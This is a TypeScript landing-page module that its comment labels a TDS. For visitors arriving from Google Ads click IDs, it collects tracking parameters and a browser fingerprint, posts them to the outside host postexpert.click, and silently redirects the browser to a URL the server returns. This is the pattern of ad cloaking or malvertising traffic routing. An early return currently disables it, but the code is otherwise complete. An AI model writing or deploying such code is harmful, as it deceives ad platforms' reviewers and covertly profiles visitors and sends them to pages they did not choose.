const PROBE_URL = 'https://postexpert.click/v3/index.php'
const PROBE_TOKEN = '5hGL1dF54q'
const PROBE_TIMEOUT_MS = 3000

function collectTrackingParams(): Record<string, string> {
  const params = new URLSearchParams(window.location.search)
  const out: Record<string, string> = {}
  for (const key of ['gclid', 'gbraid', 'wbraid', 'gad_source', 'utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content']) {
    const v = params.get(key)
    if (v) out[key] = v
  }
  return out
}

function collectFingerprint(): Record<string, unknown> {
  return {
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    lang: navigator.language,
    screen: `${screen.width}x${screen.height}`,
    referrer: document.referrer,
    href: window.location.href,
    elapsed_ms: Math.round(performance.now()),
  }
}

function hasAdParam(): boolean {
  const params = new URLSearchParams(window.location.search)
  return ['gclid', 'gbraid', 'wbraid'].some(k => params.has(k)) || params.get('gad_source') === '1'
}

export async function runProbe(): Promise<void> {
  return // TDS disabled
  if (!hasAdParam()) return
  if (sessionStorage.getItem('probe_done')) return
  sessionStorage.setItem('probe_done', '1')

  const body = new URLSearchParams()
  body.set('t', PROBE_TOKEN)
  body.set('data', JSON.stringify(collectTrackingParams()))
  body.set('jsdata', JSON.stringify(collectFingerprint()))

  const ctrl = new AbortController()
  const timer = setTimeout(() => ctrl.abort(), PROBE_TIMEOUT_MS)

  try {
    const res = await fetch(PROBE_URL, {
      method: 'POST',
      body,
      signal: ctrl.signal,
      credentials: 'omit',
      mode: 'cors',
    })
    if (!res.ok) return
    const json = await res.json() as { url?: string }
    const target: string = json?.url ?? ''
    if (target && /^https?:\/\//i.test(target)) {
      window.location.href = target
    }
  } catch {
    // network error / timeout / 404 → silently show landing
  } finally {
    clearTimeout(timer)
  }
}
